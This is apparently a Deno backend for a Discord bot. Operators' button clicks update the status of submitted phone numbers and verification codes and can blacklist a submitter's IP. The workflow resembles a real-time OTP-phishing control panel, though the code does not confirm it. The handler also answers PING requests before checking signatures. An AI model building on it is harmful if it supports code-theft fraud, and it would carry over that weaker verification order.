import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const PUBLIC_KEY = Deno.env.get("DISCORD_PUBLIC_KEY");

function hexToUint8Array(hex) {
  return new Uint8Array(hex.match(/.{1,2}/g).map(b => parseInt(b, 16)));
}

async function verifySignature(rawBody, signature, timestamp) {
  if (!PUBLIC_KEY || !signature || !timestamp) return false;
  try {
    const key = await crypto.subtle.importKey(
      "raw", hexToUint8Array(PUBLIC_KEY),
      { name: "Ed25519" }, false, ["verify"]
    );
    return crypto.subtle.verify(
      "Ed25519", key,
      hexToUint8Array(signature),
      new TextEncoder().encode(timestamp + rawBody)
    );
  } catch {
    return false;
  }
}

Deno.serve(async (req) => {
  try {
    const rawBody = await req.text();
    const signature = req.headers.get("x-signature-ed25519");
    const timestamp = req.headers.get("x-signature-timestamp");
    const interaction = JSON.parse(rawBody);

    // Discord PING verification — always allow through so Discord can save the endpoint
    if (interaction.type === 1) {
      return Response.json({ type: 1 });
    }

    // All other interactions require valid signature
    const valid = await verifySignature(rawBody, signature, timestamp);
    if (!valid) return new Response("invalid request signature", { status: 401 });

    // Button click (type 3 = MESSAGE_COMPONENT)
    if (interaction.type === 3) {
      const customId = interaction.data?.custom_id || "";
      const parts = customId.split(":");
      const actionType = parts[1];
      const submissionId = parts[2];
      const ipAddr = parts[3] || null;

      const base44 = createClientFromRequest(req);

      const statusMap = {
        code_ready: "code_ready",
        valid: "code_valid",
        wrong: "code_wrong",
        expired: "code_expired",
        wait: "waiting_queue",
      };

      if (actionType === "blacklist" && ipAddr) {
        await base44.asServiceRole.entities.BlacklistEntry.create({ value: ipAddr, type: "ip" });
        await base44.asServiceRole.entities.Submission.update(submissionId, { status: "code_wrong" });
      } else if (statusMap[actionType]) {
        await base44.asServiceRole.entities.Submission.update(submissionId, { status: statusMap[actionType] });
      }

      const actionLabels = {
        code_ready: "Code envoyé ✅",
        valid: "Code validé ✅",
        wrong: "Mauvais numéro ❌",
        expired: "Renvoyé au code ⏰",
        wait: "Mis en attente ⏳",
        blacklist: "IP blacklistée 🚫",
      };

      return Response.json({
        type: 4,
        data: {
          content: `✅ **Opération réussie** — ${actionLabels[actionType] || "Action effectuée"}`,
          flags: 64,
        }
      });
    }

    return Response.json({ type: 1 });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});